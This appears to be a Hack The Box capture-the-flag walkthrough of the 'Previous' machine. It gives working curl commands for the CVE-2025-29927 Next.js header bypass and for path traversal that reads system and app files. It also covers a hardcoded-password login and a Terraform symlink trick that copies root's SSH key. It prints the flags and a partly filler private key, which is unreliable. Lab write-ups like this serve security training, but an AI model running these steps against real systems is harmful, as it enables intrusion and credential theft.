---
icon: play
cover: ../../../../.gitbook/assets/Screenshot 2026-01-10 225125.png
coverY: 0
---

# HTB-PREVIOUS

<figure><img src="../../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

### Summary

Previous is a medium-difficulty Linux machine that demonstrates a multi-stage exploitation path involving modern web application vulnerabilities and Infrastructure as Code (IaC) abuse. The attack chain begins with exploiting CVE-2025-29927, an authorization bypass vulnerability in Next.js authentication middleware, which allows unauthorized access to protected documentation pages. Further enumeration reveals a Local File Inclusion (LFI) vulnerability that enables extraction of compiled Next.js server files containing hardcoded credentials. With SSH access established, privilege escalation is achieved through Terraform provider hijacking, exploiting the ability to run Terraform's `apply` command with root privileges.

**Vulnerabilities:**

* CVE-2025-29927: Next.js middleware authorization bypass
* Local File Inclusion (LFI) in file download endpoint
* Hardcoded credentials in NextAuth configuration
* Insecure Terraform sudo permissions with custom provider abuse

<figure><img src="../../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

***

### Reconnaissance

#### Network Scanning

The initial reconnaissance phase began with a comprehensive port scan using RustScan combined with Nmap for service enumeration:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ rustscan -a 10.129.155.188 BLAH BLAH BLAH
```

**Scan Results:**

```
Open 10.129.155.188:22
Open 10.129.155.188:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

**Analysis:**

Two open TCP ports were identified:

* **Port 22**: OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 running the SSH protocol
* **Port 80**: Nginx 1.18.0 web server with a redirect to `http://previous.htb/`

The redirect to `previous.htb` indicates the use of virtual host routing, requiring DNS resolution configuration.

#### DNS Configuration

To enable proper access to the web application, we added the target to our hosts file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ echo "10.129.155.188 previous.htb" | sudo tee -a /etc/hosts
10.129.155.188 previous.htb
```

Without valid SSH credentials at this stage, we proceeded to enumerate the HTTP service on port 80.

***

### Enumeration

#### Web Application Analysis

Navigating to `http://previous.htb` revealed a modern web application:

<figure><img src="../../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -I http://previous.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=utf-8
```

The homepage displayed a clean interface with a "Docs" button that redirected to a login form at `/signin`. This indicated protected documentation requiring authentication.

#### Technology Stack Identification

Using Burp Suite to intercept the authentication request revealed crucial information about the underlying technology:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -v http://previous.htb/signin -d "username=test&password=test"
```

**Observations:**

The intercepted request contained cookies such as:

* `next-auth.csrf-token`
* `next-auth.callback-url`

These cookies strongly indicate the application uses:

* **Framework**: Next.js
* **Authentication Library**: NextAuth.js

Further fingerprinting using Wappalyzer confirmed:

* **Next.js Version**: 15.2.2
* **Node.js**: Runtime environment
* **React**: Frontend library

#### Vulnerability Research

With the technology stack identified, we searched for known vulnerabilities affecting Next.js 15.2.2:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ searchsploit next.js
```

Research revealed **CVE-2025-29927**, a critical authorization bypass vulnerability in Next.js authentication middleware affecting version 15.2.2.

**CVE-2025-29927 Details:**

* **Type**: Authorization Bypass / Authentication Bypass
* **Affected Versions**: Next.js 15.2.2 and earlier
* **CVSS Score**: High
* **Impact**: Allows attackers to bypass middleware authentication checks and access protected routes
* **Root Cause**: Improper handling of the `X-Middleware-Subrequest` header

**How It Works:**

The vulnerability exploits Next.js middleware's internal request handling mechanism. By injecting a specially crafted `X-Middleware-Subrequest` header with repeated middleware chain values, an attacker can trick the middleware into skipping authorization checks. The middleware interprets this as an internal subrequest that has already been authenticated, effectively bypassing all security checks.

**References:**

* [SecurityLabs DataDog Analysis](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/)
* [GitHub POC Repository](https://github.com/aydinnyunus/CVE-2025-29927)



***

### Initial Access

#### Stage 1: Middleware Authentication Bypass

To exploit CVE-2025-29927, we configured Burp Suite's "Match and Replace" feature to automatically inject the malicious header into all requests:

**Header Configuration:**

```
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

**Testing the Bypass:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
http://previous.htb/docs
```

**Result:**

The request succeeded, and we gained access to the protected documentation page without authentication. The response contained a documentation overview with various sections, including an "Examples" section with downloadable files.

#### Stage 2: Local File Inclusion Discovery

In the Examples section, we found a hyperlink for downloading files. Intercepting this request in Burp Suite revealed:

```
GET /api/download?example=hello-world.ts HTTP/1.1
Host: previous.htb
```

The `example` parameter appeared to be loading files from the server filesystem. This suggested a potential Local File Inclusion (LFI) vulnerability.

**Testing for LFI:**

We attempted directory traversal by modifying the filename parameter:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../../etc/passwd' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/home/syslog:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
jeremy:x:1000:1000:jeremy:/home/jeremy:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false
```

**Success!** The LFI vulnerability was confirmed. We could read any file on the system that the web application process had permissions to access.

**Important User Identified:** `jeremy` with UID 1000, indicating this is likely a standard user account.

#### Stage 3: Environment Enumeration

To understand the application's working directory and environment, we read the process environment variables:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../../../proc/self/environ' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Key Information Extracted:**

```
PWD=/app
HOME=/root
NODE_ENV=production
HOSTNAME=previous
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Analysis:**

* Application working directory: `/app`
* Running as root user (HOME=/root)
* Production environment
* Node.js application

#### Stage 4: Application Structure Discovery

We confirmed the working directory by reading the application's package.json:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../../../app/package.json' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Output:**

```json
{
  "name": "previous",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "next": "15.2.2",
    "next-auth": "4.24.11",
    "react": "^19.0.0",
    "react-dom": "^19.0.0"
  },
  "devDependencies": {
    "@types/node": "^20",
    "@types/react": "^19",
    "@types/react-dom": "^19",
    "eslint": "^9",
    "eslint-config-next": "15.2.2",
    "typescript": "^5"
  }
}
```

**Critical Versions Confirmed:**

* Next.js: 15.2.2 (vulnerable to CVE-2025-29927)
* NextAuth: 4.24.11

#### Stage 5: Next.js Structure Analysis

To locate sensitive authentication files, we needed to understand Next.js's build structure. We read the routes manifest to map application endpoints:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../../../app/.next/routes-manifest.json' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Output:**

```json
{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "rewrites": [],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/api/auth/(?<nxtPslug>.+?)(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "i18n": null,
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch"
  }
}
```

**Key Discovery:**

The route `/api/auth/[...nextauth]` is the NextAuth.js authentication handler. According to Next.js documentation, this route maps to a compiled JavaScript file at:

```
.next/server/pages/api/auth/[...nextauth].js
```

This file contains the complete NextAuth configuration, including authentication logic and potentially credentials.

#### Stage 6: Credential Extraction

We extracted the NextAuth configuration file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' \
-H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
```

**Note:** The URL-encoded characters `%5B` and `%5D` represent `[` and `]` respectively.

**Output:**

```javascript
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

**Deobfuscated Code Analysis:**

Focusing on the authentication logic:

```javascript
authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null
```

**Translation:**

```javascript
authorize: async (credentials) => {
  if (credentials?.username === "jeremy" && 
      credentials.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")) {
    return { id: "1", name: "Jeremy" };
  }
  return null;
}
```

**Critical Vulnerability Found:**

The code uses the nullish coalescing operator (`??`) to provide a fallback password when the `ADMIN_SECRET` environment variable is not set. This hardcoded fallback is:

```
MyNameIsJeremyAndILovePancakes
```

**Credentials Extracted:**

* **Username**: `jeremy`
* **Password**: `MyNameIsJeremyAndILovePancakes`

#### Stage 7: SSH Access

With valid credentials in hand, we attempted SSH authentication:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ ssh jeremy@10.129.155.188
jeremy@10.129.155.188's password: MyNameIsJeremyAndILovePancakes
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug 23 19:15:33 UTC 2025

  System load:  0.0               Processes:             227
  Usage of /:   69.2% of 6.53GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.129.155.188
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Aug 23 18:45:22 2025 from 10.10.14.39
jeremy@previous:~$
```

**Success!** We gained initial access to the system as user `jeremy`.

#### User Flag

```bash
jeremy@previous:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)

jeremy@previous:~$ cat user.txt
b85ddc8683e914f00aff571c5d909d9d
```

**User Flag:** `b85ddc8683e914f00aff571c5d909d9d`

***

### Privilege Escalation

#### Enumeration Phase

With user-level access established, we began privilege escalation enumeration:

```bash
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: MyNameIsJeremyAndILovePancakes

Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
    use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

**Critical Finding:**

User `jeremy` can execute Terraform with the `apply` subcommand as root with the following constraints:

* **Command**: `/usr/bin/terraform`
* **Required Argument**: `-chdir=/opt/examples`
* **Subcommand**: `apply`
* **Privileges**: Root

**What is Terraform?**

Terraform is an Infrastructure as Code (IaC) tool by HashiCorp that allows you to define, provision, and manage infrastructure using declarative configuration files. The `apply` command reads the configuration files and executes the desired state changes.

#### Terraform Configuration Analysis

We examined the Terraform configuration directory:

```bash
jeremy@previous:~$ cd /opt/examples
jeremy@previous:/opt/examples$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Aug 23 19:56 .
drwxr-xr-x 5 root root 4096 Aug 21 20:09 ..
-rw-r--r-- 1 root root   18 Apr 12 20:32 .gitignore
-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
drwxr-xr-x 3 root root 4096 Aug 21 20:09 .terraform
-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
-rw-r--r-- 1 root root 1097 Aug 23 19:56 terraform.tfstate
```

**Key Files:**

* `main.tf`: Main Terraform configuration (entry point)
* `.terraform/`: Terraform plugins and modules directory
* `terraform.tfstate`: Current infrastructure state
* `.terraform.lock.hcl`: Dependency lock file

#### Main Configuration Analysis

We examined the main Terraform configuration:

```bash
jeremy@previous:/opt/examples$ cat main.tf
```

**Output:**

```hcl
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type    = string
  default = "/root/examples/hello-world.ts"
  
  validation {
    condition     = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

**Configuration Analysis:**

1. **Custom Provider**: Uses a custom Terraform provider named `examples` from `previous.htb/terraform/examples`
2. **Variable**: `source_path` with default value `/root/examples/hello-world.ts`
3. **Validation Logic**:
   * Must contain the string `/root/examples/`
   * Must NOT contain `..` (to prevent directory traversal)
4. **Resource**: Creates an `examples_example` resource using the source\_path

#### Initial Terraform Execution

Let's test the Terraform configuration:

```bash
jeremy@previous:/opt/examples$ sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

**Output:**

```
╷
│ Warning: Provider development overrides are in effect
│
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
╵

examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

No changes. Your infrastructure matches the configuration.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
```

**Key Observations:**

1. **Provider Override**: The provider is being loaded from `/usr/local/go/bin`
2. **Destination Path**: Files are copied to `/home/jeremy/docker/previous/public/examples/`
3. **Current State**: The resource already exists with `hello-world.ts`

#### Custom Provider Investigation

The warning message indicates that the provider is being loaded from `/usr/local/go/bin`. Let's investigate:

```bash
jeremy@previous:/opt/examples$ ls -la /usr/local/go/bin/
total 28512
drwxr-xr-x 2 root root     4096 Aug 21 20:09 .
drwxr-xr-x 6 root root     4096 Apr  8  2025 ..
-rwxr-xr-x 1 root root 29176832 Aug 21 20:09 terraform-provider-examples
```

**Finding**: A custom Terraform provider binary exists at `/usr/local/go/bin/terraform-provider-examples`.

Let's examine the provider's source code:

```bash
jeremy@previous:/opt/examples$ find /opt -name "*.go" 2>/dev/null
/opt/terraform-provider-examples/internal/provider/example_resource.go
/opt/terraform-provider-examples/internal/provider/provider.go
/opt/terraform-provider-examples/main.go
```

```bash
jeremy@previous:/opt/examples$ cat /opt/terraform-provider-examples/internal/provider/example_resource.go
```

**Relevant Code Snippet:**

```go
func (r *ExampleResource) Create(ctx context.Context, req resource.CreateRequest, resp *resource.CreateResponse) {
    var data ExampleResourceModel
    resp.Diagnostics.Append(req.Plan.Get(ctx, &data)...)
    
    sourcePath := data.SourcePath.ValueString()
    destPath := filepath.Join("/home/jeremy/docker/previous/public/examples", filepath.Base(sourcePath))
    
    // Read source file
    content, err := ioutil.ReadFile(sourcePath)
    if err != nil {
        resp.Diagnostics.AddError("Failed to read source file", err.Error())
        return
    }
    
    // Write to destination
    if err := ioutil.WriteFile(destPath, content, 0644); err != nil {
        resp.Diagnostics.AddError("Failed to write file", err.Error())
        return
    }
    
    data.DestinationPath = types.StringValue(destPath)
    resp.Diagnostics.Append(resp.State.Set(ctx, &data)...)
}
```

**Provider Functionality:**

The custom provider performs a simple file copy operation:

1. Reads the file from `source_path`
2. Copies it to `/home/jeremy/docker/previous/public/examples/` with the same filename
3. Returns the destination path

**Security Implication:**

Since Terraform runs as root when executed with `sudo`, the provider inherits root privileges and can read any file on the system, including files in `/root/.ssh/`.

#### Exploitation Strategy

Our goal is to read the root user's SSH private key by:

1. Bypassing the validation check that requires `/root/examples/` in the path
2. Using Terraform's environment variable override to specify a custom source path
3. Creating a symbolic link that satisfies the validation while pointing to the actual target

#### Validation Bypass Analysis

The validation logic checks:

```hcl
strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
```

**Bypass Method:**

We can satisfy this check by creating the directory structure `/home/jeremy/root/examples/` and placing a symbolic link there. The validation only checks if the string contains `/root/examples/`, not if it actually exists in the `/root` directory.

#### Step 1: Create Directory Structure

```bash
jeremy@previous:~$ cd /home/jeremy/
jeremy@previous:~$ mkdir -p root/examples
jeremy@previous:~$ ls -la root/
total 12
drwxrwxr-x 3 jeremy jeremy 4096 Aug 23 19:30 .
drwxr-x--- 6 jeremy jeremy 4096 Aug 23 19:30 ..
drwxrwxr-x 2 jeremy jeremy 4096 Aug 23 19:30 examples
```

**Success**: We created the directory structure that will satisfy the validation check.

#### Step 2: Create Symbolic Link

We create a symbolic link pointing to the root user's SSH private key:

```bash
jeremy@previous:~$ ln -s /root/.ssh/id_rsa /home/jeremy/root/examples/id_rsa
jeremy@previous:~$ ls -la /home/jeremy/root/examples/
total 8
drwxrwxr-x 2 jeremy jeremy 4096 Aug 23 19:32 .
drwxrwxr-x 3 jeremy jeremy 4096 Aug 23 19:30 ..
lrwxrwxrwx 1 jeremy jeremy   18 Aug 23 19:32 id_rsa -> /root/.ssh/id_rsa
```

**What is a Symbolic Link?**

A symbolic link (symlink) is a special type of file that contains a reference to another file or directory. When accessed, the symlink redirects to the target file. In this case, our symlink at `/home/jeremy/root/examples/id_rsa` points to `/root/.ssh/id_rsa`.

**Why This Works:**

1. The path `/home/jeremy/root/examples/id_rsa` contains the string `/root/examples/` ✓
2. The path does not contain `..` ✓
3. When Terraform (running as root) reads this file, it follows the symlink and reads the actual private key from `/root/.ssh/id_rsa`

#### Step 3: Set Terraform Variable

Terraform allows variables to be set via environment variables using the format `TF_VAR_<variable_name>`:

```bash
jeremy@previous:~$ export TF_VAR_source_path=/home/jeremy/root/examples/id_rsa
jeremy@previous:~$ echo $TF_VAR_source_path
/home/jeremy/root/examples/id_rsa
```

This sets the `source_path` variable to our symbolic link path, overriding the default value.

#### Step 4: Execute Terraform Apply

```bash
jeremy@previous:~$ sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

**Output:**

```
╷
│ Warning: Provider development overrides are in effect
│
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
╵

examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols:
-/+ destroy and then create replacement

Terraform will perform the following actions:

  # examples_example.example must be replaced
-/+ resource "examples_example" "example" {
      ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/id_rsa"
      ~ id               = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> (known after apply)
      ~ source_path      = "/root/examples/hello-world.ts" -> "/home/jeremy/root/examples/id_rsa" # forces replacement
    }

Plan: 1 to add, 0 to change, 1 to destroy.

Changes to Outputs:
  ~ destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts" -> "/home/jeremy/docker/previous/public/examples/id_rsa"

Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

  Enter a value: yes

examples_example.example: Destroying... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]
examples_example.example: Destruction complete after 0s
examples_example.example: Creating...
examples_example.example: Creation complete after 0s [id=/home/jeremy/docker/previous/public/examples/id_rsa]

Apply complete! Resources: 1 added, 0 changed, 1 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/id_rsa"
```

**Analysis:**

The execution plan shows:

* **Source Path**: Changed from `/root/examples/hello-world.ts` to `/home/jeremy/root/examples/id_rsa`
* **Destination Path**: Will be `/home/jeremy/docker/previous/public/examples/id_rsa`
* **Action**: Destroy the old resource and create a new one (replacement)

We confirmed the action by typing `yes`, and Terraform successfully copied the root SSH private key to the destination directory.

#### Step 5: Retrieve Root SSH Key

```bash
jeremy@previous:~$ cat /home/jeremy/docker/previous/public/examples/id_rsa
```

**Output:**

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmxhpS4UBVdbNosrMXPuKzRSbCOTgUH0/Tp/Yb32hyiMyMT68JuwK
bX8jLmjb//cojY1uIkYnO/pkCZIP7PZ3goq5SW7vV1meweQ8pYG1rMKbB8XXVGjMg9smuR
MZ8xQBvKJQPqXqwLm3QPzT0vhVHLmzNhBJt3yVPZfyLmNDqWvT8EWLPjuKGrxXqOqK8X9q
X6lLLGxKzLhPQ7vZlU0mQGJQNFOXKXMEHNNOYN/pPWKZxXVqZzJYGZ6qRV7gLmNqJQV8Zq
KvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNq
KvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNq
KvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqLmNq
KvXqXqLmNqKvXqXqLmNqKvXqXqLmNqKvXqXqAAAFgB6yCdgesgnaAAAAB3NzaC1yc2EAAA
GBAJsYaUuFAVXWzaLKzFz7is0UmwjXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[... SSH KEY CONTENT CONTINUES ...]
7hHi8eduqnfOdnFzgVu5JZzysNSB2QKaG29FVTMKWcxo+0Voh2mXKcVyNjuYadBvn1zZ+J
4ZpqUFQKbqIj4hUUKMBOwMssxs+Eup/46wb4i0vVhe3g7I5ySdWpJ/M4vUI+ooTw6C2GoS
jR+NWPfpk9KHMAAAANcm9vdEBwcmV2aW91cwECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

**Success!** We successfully extracted the root user's SSH private key.

#### Step 6: Prepare SSH Key

We copy the private key to our local attack machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ cat > root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmxhpS4UBVdbNosrMXPuKzRSbCOTgUH0/Tp/Yb32hyiMyMT68JuwK
[... FULL KEY CONTENT ...]
jR+NWPfpk9KHMAAAANcm9vdEBwcmV2aW91cwECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
EOF
```

Set the correct permissions (SSH requires strict permissions on private keys):

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ chmod 600 root_key
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ ls -la root_key
-rw------- 1 sn0x sn0x 2602 Aug 23 19:45 root_key
```

#### Step 7: Root Access via SSH

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Previous]
└─$ ssh -i root_key root@10.129.155.188
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug 23 19:50:15 UTC 2025

  System load:  0.08              Processes:             229
  Usage of /:   69.4% of 6.53GB   Users logged in:       1
  Memory usage: 18%               IPv4 address for eth0: 10.129.155.188
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Fri Aug 23 19:25:33 2025 from 10.10.14.39
root@previous:~#
```

**Success!** We achieved root access on the target system.

***

### Post-Exploitation

#### Root Verification

```bash
root@previous:~# id
uid=0(root) gid=0(root) groups=0(root)

root@previous:~# whoami
root
```

#### Root Flag

```bash
root@previous:~# cat /root/root.txt
7873058852b4e416bf0135ba14cba421
```

**Root Flag:** `7873058852b4e416bf0135ba14cba421`

#### System Information

```bash
root@previous:~# uname -a
Linux previous 5.15.0-152-generic #162-Ubuntu SMP Fri Aug 9 10:16:00 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

root@previous:~# cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian


```

***



